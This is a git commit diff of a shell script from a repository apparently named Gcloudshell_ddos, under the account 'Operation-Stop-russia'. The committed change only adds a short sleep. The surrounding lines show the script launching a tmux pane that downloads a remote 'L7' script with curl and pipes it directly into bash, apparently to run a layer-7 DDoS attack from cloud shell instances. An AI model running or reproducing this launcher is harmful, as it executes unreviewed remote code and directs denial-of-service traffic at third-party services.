b94d7431430ea999541681a1589193961b24f7c7
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-18 08:09:43 +0300

    Update Start_dualShell.sh

--- Start_dualShell.sh
+++ Start_dualShell.sh
@@ -13,6 +13,7 @@ python3 -m pip install -r requirements.txt
 cd ~
 
 echo -e " \v Operation - Stop russia \v  \v  \v "
+sleep 0.1
 echo -e "For control CPU&RAM usage enter - top\v here"
 sleep 2
 tmux split-window -v -p 87 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7 | bash'
